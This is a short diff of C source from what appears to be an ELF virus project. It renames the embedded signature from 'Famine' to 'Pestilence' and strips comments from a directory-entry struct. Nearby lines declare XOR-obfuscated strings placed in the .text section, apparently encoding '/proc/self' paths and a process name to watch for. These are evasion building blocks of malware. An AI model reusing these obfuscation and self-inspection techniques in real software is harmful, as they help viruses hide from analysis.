@@ -10,7 +10,8 @@
 
 #define BUILDER_SIZE 0x151;
 #define BUILDER_RE_ENTRY_OFFSET 0xe5;
-__attribute__((section(".text"))) volatile static char signatur[] = "Famine | abied-ch & fbruggem";
+
+__attribute__((section(".text"))) volatile static char signatur[] = "Pestilence | abied-ch & fbruggem";
 __attribute__((section(".text"))) volatile static char signaur[] = "ahhhhhhhh{";
 __attribute__((section(".text"))) volatile static char path_self[] = {0x6d, 0x32, 0x30, 0x2d, 0x21, 0x6d, 0x31, 0x27, 0x2e, 0x24, 0x6d, 0x27, 0x3a, 0x27, 0x00};
 __attribute__((section(".text"))) volatile static char mappings_path[] = {0x6d, 0x32, 0x30, 0x2d, 0x21, 0x6d, 0x31, 0x27,
@@ -19,13 +20,13 @@ __attribute__((section(".text"))) volatile static char slash_proc[] = {0x6d, 0x3
 __attribute__((section(".text"))) volatile static char slash_cmdline[] = {0x6d, 0x21, 0x2f, 0x26, 0x2e, 0x2b, 0x2c, 0x27, 0x00};
 __attribute__((section(".text"))) volatile static char bad_process_name[] = {0x73, 0x72, 0x74, 0x77, 0x23, 0x71, 0x26, 0x7b, 0x77,
                                                                              0x23, 0x23, 0x77, 0x76, 0x77, 0x73, 0x20, 0x00};
-// Structs
+
 typedef struct {
-    uint64_t d_ino;          /* 64-bit inode number */
-    uint64_t d_off;          /* Not an offset; see getdents() */
-    unsigned short d_reclen; /* Size of this dirent */
-    unsigned char d_type;    /* File type */
-    char d_name[];           /* Filename (null-terminated) */
+    uint64_t d_ino;
+    uint64_t d_off;
+    unsigned short d_reclen;
+    unsigned char d_type;
+    char d_name[];
 } dirent64;
 
 typedef struct {
